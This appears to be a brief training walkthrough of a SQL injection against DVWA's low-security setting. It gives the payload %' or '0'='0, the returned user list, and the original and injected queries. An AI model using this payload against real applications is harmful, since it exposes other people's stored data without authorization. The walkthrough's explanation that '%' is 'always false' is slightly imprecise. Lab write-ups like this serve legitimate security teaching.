In DVWA set security to low and go to SQL Injection

Try: 1

#OUTPUT:
	ID: 1
	First name: admin
	Surname: admin

Then try: %' or '0'='0

#OUTPUT:
	ID: %' or '0'='0
	First name: admin
	Surname: admin

	ID: %' or '0'='0
	First name: Gordon
	Surname: Brown

	ID: %' or '0'='0
	First name: Hack
	Surname: Me

	ID: %' or '0'='0
	First name: Pablo
	Surname: Picasso

	ID: %' or '0'='0
	First name: Bob
	Surname: Smith

This query will return all the users because % is always false (the ID is a number) and 0 is always equals to 0

Original query:	SELECT first_name, last_name FROM users WHERE user_id = '%id';
Faked query: SELECT first_name, last_name FROM users WHERE user_id = '%' or '0'='0';
